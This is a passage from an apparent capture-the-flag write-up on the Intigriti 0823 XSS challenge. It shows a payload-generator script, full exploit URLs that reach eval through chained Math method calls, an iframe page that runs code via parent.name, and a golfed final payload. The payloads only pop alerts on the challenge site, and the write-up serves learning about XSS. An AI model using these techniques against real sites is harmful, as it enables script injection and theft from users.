class="token punctuation">)</span>    currentIndex<span class="token operator">++</span>  <span class="token punctuation">&#125;</span>  <span class="token comment">// add eval structure</span>  <span class="token comment">// generate space then trim</span>  <span class="token keyword">let</span> spaceResult <span class="token operator">=</span> <span class="token function">findTargetNumber</span><span class="token punctuation">(</span>currentIndex<span class="token punctuation">,</span> <span class="token string">' '</span><span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  spaceResult<span class="token punctuation">.</span><span class="token function">reverse</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">// remember to reverse cause the order</span>  <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> row <span class="token keyword">of</span> spaceResult<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">addFunction</span><span class="token punctuation">(</span>row<span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span>  <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token string">'Math.abs.name.constructor.fromCharCode'</span><span class="token punctuation">)</span>  <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token string">'Math.abs.name.constructor.prototype.trim.call'</span><span class="token punctuation">)</span>  <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>arrName<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">.join</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>  <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token string">'Math.abs.constructor'</span><span class="token punctuation">)</span>  <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token string">'Math.abs.constructor.prototype.call.call'</span><span class="token punctuation">)</span>  <span class="token keyword">return</span> ans<span class="token punctuation">.</span><span class="token function">reverse</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">)</span>  <span class="token comment">//return codeResult</span>  <span class="token keyword">function</span> <span class="token function">addFunction</span><span class="token punctuation">(</span><span class="token parameter">name</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    ans<span class="token punctuation">.</span><span class="token function">unshift</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span>    codeResult <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>name<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">(</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>codeResult<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">)</span><span class="token template-punctuation string">`</span></span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">buildExploit</span><span class="token punctuation">(</span><span class="token string">'Math.seeds'</span><span class="token punctuation">,</span> <span class="token string">'alert(document.domain)'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>The final result is:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span>pop<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span>pop<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span>pop<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span>pop<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span>pop<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>abs<span class="token punctuation">.</span>name<span class="token punctuation">.</span>at<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span>push<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>clz32<span class="token punctuation">.</span>name<span class="token punctuation">.</span>at<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span>push<span class="token punctuation">,</span>Math<span class="token punctuation">.</span><span class="token constant">LN2</span><span class="token punctuation">.</span>valueOf<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>exp<span class="token punctuation">.</span>name<span class="token punctuation">.</span>at<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span>push<span class="token punctuation">,</span>Math<span class="token punctuation">.</span><span class="token constant">LN2</span><span class="token punctuation">.</span>valueOf<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>round<span class="token punctuation">.</span>name<span class="token punctuation">.</span>at<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span>push<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>hypot<span class="token punctuation">.</span>name<span class="token punctuation">.</span>at<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span>push<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>clz32<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>cosh<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>log2<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>floor<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>abs<span class="token punctuation">.</span>name<span class="token punctuation">.</span>constructor<span class="token punctuation">.</span>fromCharCode<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span>push<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>cosh<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>log<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>cosh<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>floor<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>abs<span class="token punctuation">.</span>name<span class="token punctuation">.</span>constructor<span class="token punctuation">.</span>fromCharCode<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span>push<span class="token punctuation">,</span>Math<span class="token punctuation">.</span><span class="token constant">LOG2E</span><span class="token punctuation">.</span>valueOf<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>cos<span class="token punctuation">.</span>name<span class="token punctuation">.</span>at<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span>push<span class="token punctuation">,</span>Math<span class="token punctuation">.</span><span class="token constant">LN2</span><span class="token punctuation">.</span>valueOf<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>cos<span class="token punctuation">.</span>name<span class="token punctuation">.</span>at<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span>push<span class="token punctuation">,</span>Math<span class="token punctuation">.</span><span class="token constant">E</span><span class="token punctuation">.</span>valueOf<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>imul<span class="token punctuation">.</span>name<span class="token punctuation">.</span>at<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span>push<span class="token punctuation">,</span>Math<span class="token punctuation">.</span><span class="token constant">LN2</span><span class="token punctuation">.</span>valueOf<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>max<span class="token punctuation">.</span>name<span class="token punctuation">.</span>at<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span>push<span class="token punctuation">,</span>Math<span class="token punctuation">.</span><span class="token constant">LN2</span><span class="token punctuation">.</span>valueOf<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>exp<span class="token punctuation">.</span>name<span class="token punctuation">.</span>at<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span>push<span class="token punctuation">,</span>Math<span class="token punctuation">.</span><span class="token constant">E</span><span class="token punctuation">.</span>valueOf<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>min<span class="token punctuation">.</span>name<span class="token punctuation">.</span>at<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span>push<span class="token punctuation">,</span>Math<span class="token punctuation">.</span><span class="token constant">LN2</span><span class="token punctuation">.</span>valueOf<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>tan<span class="token punctuation">.</span>name<span class="token punctuation">.</span>at<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span>push<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>log2<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>exp<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>ceil<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>abs<span class="token punctuation">.</span>name<span class="token punctuation">.</span>constructor<span class="token punctuation">.</span>fromCharCode<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span>push<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>clz32<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>sqrt<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>cosh<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>ceil<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>abs<span class="token punctuation">.</span>name<span class="token punctuation">.</span>constructor<span class="token punctuation">.</span>fromCharCode<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span>push<span class="token punctuation">,</span>Math<span class="token punctuation">.</span><span class="token constant">LOG2E</span><span class="token punctuation">.</span>valueOf<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>cos<span class="token punctuation">.</span>name<span class="token punctuation">.</span>at<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span>push<span class="token punctuation">,</span>Math<span class="token punctuation">.</span><span class="token constant">LN2</span><span class="token punctuation">.</span>valueOf<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>max<span class="token punctuation">.</span>name<span class="token punctuation">.</span>at<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span>push<span class="token punctuation">,</span>Math<span class="token punctuation">.</span><span class="token constant">LN2</span><span class="token punctuation">.</span>valueOf<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>abs<span class="token punctuation">.</span>name<span class="token punctuation">.</span>at<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span>push<span class="token punctuation">,</span>Math<span class="token punctuation">.</span><span class="token constant">LN2</span><span class="token punctuation">.</span>valueOf<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>imul<span class="token punctuation">.</span>name<span class="token punctuation">.</span>at<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span>push<span class="token punctuation">,</span>Math<span class="token punctuation">.</span><span class="token constant">E</span><span class="token punctuation">.</span>valueOf<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>min<span class="token punctuation">.</span>name<span class="token punctuation">.</span>at<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span>push<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>acosh<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>expm1<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>ceil<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>abs<span class="token punctuation">.</span>name<span class="token punctuation">.</span>constructor<span class="token punctuation">.</span>fromCharCode<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span>push<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>cos<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>clz32<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>abs<span class="token punctuation">.</span>name<span class="token punctuation">.</span>constructor<span class="token punctuation">.</span>fromCharCode<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>abs<span class="token punctuation">.</span>name<span class="token punctuation">.</span>constructor<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>trim<span class="token punctuation">.</span>call<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>seeds<span class="token punctuation">.</span>join<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>abs<span class="token punctuation">.</span>constructor<span class="token punctuation">,</span>Math<span class="token punctuation">.</span>abs<span class="token punctuation">.</span>constructor<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>call<span class="token punctuation">.</span>call<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Exploit URL: <a href="https://challenge-0823.intigriti.io/challenge/index.html?q=Math.seeds.pop,Math.seeds.pop,Math.seeds.pop,Math.seeds.pop,Math.seeds.pop,Math.abs.name.at,Math.seeds.push,Math.clz32.name.at,Math.seeds.push,Math.LN2.valueOf,Math.exp.name.at,Math.seeds.push,Math.LN2.valueOf,Math.round.name.at,Math.seeds.push,Math.hypot.name.at,Math.seeds.push,Math.clz32,Math.cosh,Math.log2,Math.floor,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.cosh,Math.log,Math.cosh,Math.floor,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.LOG2E.valueOf,Math.cos.name.at,Math.seeds.push,Math.LN2.valueOf,Math.cos.name.at,Math.seeds.push,Math.E.valueOf,Math.imul.name.at,Math.seeds.push,Math.LN2.valueOf,Math.max.name.at,Math.seeds.push,Math.LN2.valueOf,Math.exp.name.at,Math.seeds.push,Math.E.valueOf,Math.min.name.at,Math.seeds.push,Math.LN2.valueOf,Math.tan.name.at,Math.seeds.push,Math.log2,Math.exp,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.clz32,Math.sqrt,Math.cosh,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.LOG2E.valueOf,Math.cos.name.at,Math.seeds.push,Math.LN2.valueOf,Math.max.name.at,Math.seeds.push,Math.LN2.valueOf,Math.abs.name.at,Math.seeds.push,Math.LN2.valueOf,Math.imul.name.at,Math.seeds.push,Math.E.valueOf,Math.min.name.at,Math.seeds.push,Math.acosh,Math.expm1,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.cos,Math.clz32,Math.abs.name.constructor.fromCharCode,Math.abs.name.constructor.prototype.trim.call,Math.seeds.join,Math.abs.constructor,Math.abs.constructor.prototype.call.call">https://challenge-0823.intigriti.io/challenge/index.html?q=Math.seeds.pop,Math.seeds.pop,Math.seeds.pop,Math.seeds.pop,Math.seeds.pop,Math.abs.name.at,Math.seeds.push,Math.clz32.name.at,Math.seeds.push,Math.LN2.valueOf,Math.exp.name.at,Math.seeds.push,Math.LN2.valueOf,Math.round.name.at,Math.seeds.push,Math.hypot.name.at,Math.seeds.push,Math.clz32,Math.cosh,Math.log2,Math.floor,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.cosh,Math.log,Math.cosh,Math.floor,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.LOG2E.valueOf,Math.cos.name.at,Math.seeds.push,Math.LN2.valueOf,Math.cos.name.at,Math.seeds.push,Math.E.valueOf,Math.imul.name.at,Math.seeds.push,Math.LN2.valueOf,Math.max.name.at,Math.seeds.push,Math.LN2.valueOf,Math.exp.name.at,Math.seeds.push,Math.E.valueOf,Math.min.name.at,Math.seeds.push,Math.LN2.valueOf,Math.tan.name.at,Math.seeds.push,Math.log2,Math.exp,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.clz32,Math.sqrt,Math.cosh,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.LOG2E.valueOf,Math.cos.name.at,Math.seeds.push,Math.LN2.valueOf,Math.max.name.at,Math.seeds.push,Math.LN2.valueOf,Math.abs.name.at,Math.seeds.push,Math.LN2.valueOf,Math.imul.name.at,Math.seeds.push,Math.E.valueOf,Math.min.name.at,Math.seeds.push,Math.acosh,Math.expm1,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.cos,Math.clz32,Math.abs.name.constructor.fromCharCode,Math.abs.name.constructor.prototype.trim.call,Math.seeds.join,Math.abs.constructor,Math.abs.constructor.prototype.call.call</a></p><h2><span id="arbitrary-xss">Arbitrary XSS</span></h2><p>The above code merely executes the static <code>alert(document.domain)</code> command. Is it possible to execute arbitrary JavaScript code?</p><p>As long as a short enough payload can be found, it seems feasible.</p><p>For instance, <code>eval(location.hash.slice(1))</code> is relatively short, but still a bit long. If you use the script I provided above, it might hang for a while due to some bugs in my code. Ultimately, it generates a result of length 120, which exceeds the 100-character limit.</p><p>However, another payload like <code>eval(&quot;&#39;&quot;+location)</code> works fine and has a length of 85.</p><p><a href="https://challenge-0823.intigriti.io/challenge/index.html?q=Math.seeds.pop,Math.seeds.pop,Math.seeds.pop,Math.seeds.pop,Math.seeds.pop,Math.exp.name.at,Math.seeds.push,Math.tan,Math.sinh,Math.sinh,Math.expm1,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.atan.name.at,Math.seeds.push,Math.ceil.name.at,Math.seeds.push,Math.clz32,Math.cosh,Math.log2,Math.floor,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.cosh,Math.cbrt,Math.cosh,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.exp,Math.tan,Math.expm1,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.expm1,Math.sqrt,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.cbrt,Math.cosh,Math.expm1,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.LN2.valueOf,Math.log.name.at,Math.seeds.push,Math.LOG2E.valueOf,Math.cos.name.at,Math.seeds.push,Math.LN2.valueOf,Math.cos.name.at,Math.seeds.push,Math.LN2.valueOf,Math.abs.name.at,Math.seeds.push,Math.LN2.valueOf,Math.tan.name.at,Math.seeds.push,Math.LN2.valueOf,Math.imul.name.at,Math.seeds.push,Math.LOG2E.valueOf,Math.cos.name.at,Math.seeds.push,Math.E.valueOf,Math.min.name.at,Math.seeds.push,Math.atan,Math.sinh,Math.cosh,Math.cosh,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.cos,Math.clz32,Math.abs.name.constructor.fromCharCode,Math.abs.name.constructor.prototype.trim.call,Math.seeds.join,Math.abs.constructor,Math.abs.constructor.prototype.call.call#';alert(document.domain+'/arb-xss')">https://challenge-0823.intigriti.io/challenge/index.html?q=Math.seeds.pop,Math.seeds.pop,Math.seeds.pop,Math.seeds.pop,Math.seeds.pop,Math.exp.name.at,Math.seeds.push,Math.tan,Math.sinh,Math.sinh,Math.expm1,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.atan.name.at,Math.seeds.push,Math.ceil.name.at,Math.seeds.push,Math.clz32,Math.cosh,Math.log2,Math.floor,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.cosh,Math.cbrt,Math.cosh,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.exp,Math.tan,Math.expm1,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.expm1,Math.sqrt,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.cbrt,Math.cosh,Math.expm1,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.LN2.valueOf,Math.log.name.at,Math.seeds.push,Math.LOG2E.valueOf,Math.cos.name.at,Math.seeds.push,Math.LN2.valueOf,Math.cos.name.at,Math.seeds.push,Math.LN2.valueOf,Math.abs.name.at,Math.seeds.push,Math.LN2.valueOf,Math.tan.name.at,Math.seeds.push,Math.LN2.valueOf,Math.imul.name.at,Math.seeds.push,Math.LOG2E.valueOf,Math.cos.name.at,Math.seeds.push,Math.E.valueOf,Math.min.name.at,Math.seeds.push,Math.atan,Math.sinh,Math.cosh,Math.cosh,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.cos,Math.clz32,Math.abs.name.constructor.fromCharCode,Math.abs.name.constructor.prototype.trim.call,Math.seeds.join,Math.abs.constructor,Math.abs.constructor.prototype.call.call#&#39;;alert(document.domain+&#39;/arb-xss&#39;)</a></p><p>Once the ability to execute arbitrary code is achieved, the next step is to strive to identify the shortest possible set of operations.</p><h2><span id="code-golf-time">Code golf time</span></h2><h3><span id="shortest-xss-payload">Shortest XSS payload</span></h3><p>While the previous payload <code>eval(&quot;&#39;&quot;+location)</code> is already quite short, for this challenge, there is an even shorter payload.</p><p>I learned from @DrBrix that you can use <code>eval(parent.name)</code> to shorten the length further, and this clever technique leverages iframes.</p><p>In the challenge page, a special name was set up to ensure it doesn’t get overwritten, but we can utilize it’s parent page. The page <code>https://challenge-0823.intigriti.io/</code> embeds <code>chanllenge/index.html</code> using an iframe, so using <code>parnent.name</code> allows us to access the name of <code>https://challenge-0823.intigriti.io/</code>.</p><p>Thus, @DrBrix’s strategy is as follows: First, create a page named exp.html, add an iframe with the name set to the payload, and replace the location with <code>https://challenge-0823.intigriti.io</code>. </p><p>The structure becomes:</p><pre class="line-numbers language-none"><code class="language-none">- exp.html (top)--- https:&#x2F;&#x2F;challenge-0823.intigriti.io (name: &#39;alert(1)&#39;)------ https:&#x2F;&#x2F;challenge-0823.intigriti.io&#x2F;challenge&#x2F;index.html<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>Then you can use <code>frames[0].frames[0]</code> to access the innermost iframe and redirect it to the prepared URL, resulting in:</p><pre class="line-numbers language-none"><code class="language-none">- exp.html (top)--- https:&#x2F;&#x2F;challenge-0823.intigriti.io (name: &#39;alert(1)&#39;)------ https:&#x2F;&#x2F;challenge-0823.intigriti.io&#x2F;challenge&#x2F;index.html?q&#x3D;...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>This way, you can use <code>parent.name</code> to access the adjusted name. The code looks like this:</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript"><span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>frames<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>frames<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>location<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">'https://challenge-0823.intigriti.io/challenge/index.html?q=Math.random'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token number">3000</span><span class="token punctuation">)</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">srcdoc</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>&lt;script>name = "alert(document.domain)"document.location = "https://challenge-0823.intigriti.io/"&lt;/script><span class="token punctuation">'</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>eval(parent.name)</code> is the shortest payload I could find. The second shortest is <code>location=parent.name</code>.</p><h3><span id="empty-mathseeds">Empty Math.seeds</span></h3><p>Previously, <code>Math.seeds.pop()</code> was used to clear the content, but this part can be further shortened!</p><p>@y0d3n introduced a technique: <code>Math.seeds.splice(Math.imul())</code>.</p><p>This works because the return value of <code>Math.imul()</code> is 0, and <code>splice(0)</code> means “remove data after(and include) the first element.” Therefore, the entire array is cleared.</p><h3><span id="get-an-empty-string">Get an empty string</span></h3><p>Previously, I used a more convoluted method to generate an empty string. Later, I discovered that <code>Math.random.name</code> could yield an empty string.</p><p>This is due to this part:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">Math<span class="token punctuation">.</span><span class="token function-variable function">random</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">this</span><span class="token punctuation">.</span>seeds<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>seeds <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0.62536</span><span class="token punctuation">,</span> <span class="token number">0.458483</span><span class="token punctuation">,</span> <span class="token number">0.544523</span><span class="token punctuation">,</span> <span class="token number">0.323421</span><span class="token punctuation">,</span> <span class="token number">0.775465</span><span class="token punctuation">]</span>    next <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>seeds<span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getTime</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token keyword">this</span><span class="token punctuation">.</span>seeds<span class="token punctuation">.</span>length<span class="token punctuation">]</span>  <span class="token punctuation">&#125;</span>  next <span class="token operator">=</span> next <span class="token operator">*</span> <span class="token number">1103515245</span> <span class="token operator">+</span> <span class="token number">12345</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span>next <span class="token operator">/</span> <span class="token number">65536</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">32767</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Notice there’s no name after <code>function</code>, making it an anonymous function. So, we’re assigning an anonymous function to <code>Math.random</code>, hence <code>Math.random.name</code> becomes an empty string.</p><h3><span id="obtaining-fixed-numbers">Obtaining fixed numbers</span></h3><p>I previously used built-in constants like <code>Math.PI</code> to obtain fixed numbers. Later, I learned from @Astrid that we can use forms like <code>STRING.length.valueOf()</code> to get numbers.</p><p>For example, <code>Math.isPrototypeOf.name.length.valueOf()</code> would yield 13. Using this method, we can quickly obtain a fixed number.</p><p>Once we have a fixed number, we can find our desired number with fewer steps, and @Astrid even wrote code to find the shortest path.</p><h3><span id="final-solution">Final solution</span></h3><p>The resulting payload is composed of 59 operations and executes <code>eval(parent.name)</code>(this requires collaboration with the previously mentioned iframe to run).</p><pre class="line-numbers language-none"><code class="language-none">Math.imul,Math.seeds.splice,Math.exp.name.at,Math.seeds.push,Math.LN2.valueOf,Math.abs.name.constructor.prototype.valueOf.name.at,Math.seeds.push,Math.atan.name.at,Math.seeds.push,Math.ceil.name.at,Math.seeds.push,Math.isPrototypeOf.name.length.valueOf,Math.log2,Math.exp,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.LN2.valueOf,Math.pow.name.at,Math.seeds.push,Math.abs.name.constructor.fromCharCode.name.at,Math.seeds.push,Math.abs.name.constructor.fromCharCode.name.at,Math.seeds.push,Math.abs.name.constructor.prototype.normalize.name.at,Math.seeds.push,Math.LN2.valueOf,Math.abs.name.constructor.prototype.normalize.name.at,Math.seeds.push,Math.abs.name.constructor.prototype.codePointAt.name.at,Math.seeds.push,Math.PI.valueOf,Math.exp,Math.acosh,Math.exp,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.LN2.valueOf,Math.abs.name.constructor.prototype.normalize.name.at,Math.seeds.push,Math.LN2.valueOf,Math.abs.name.at,Math.seeds.push,Math.LN2.valueOf,Math.max.name.at,Math.seeds.push,Math.LN2.valueOf,Math.exp.name.at,Math.seeds.push,Math.asinh,Math.log2,Math.tan,Math.cosh,Math.floor,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.random.name.valueOf,Math.seeds.join,Math.abs.constructor,Math.abs.constructor.prototype.call.call<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>The script is as follows:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">findTargetFromScope</span><span class="token punctuation">(</span>scope<span class="token punctuation">,</span> matchFn<span class="token punctuation">,</span> initPath<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">let</span> visited <span class="token operator">=</span> <span 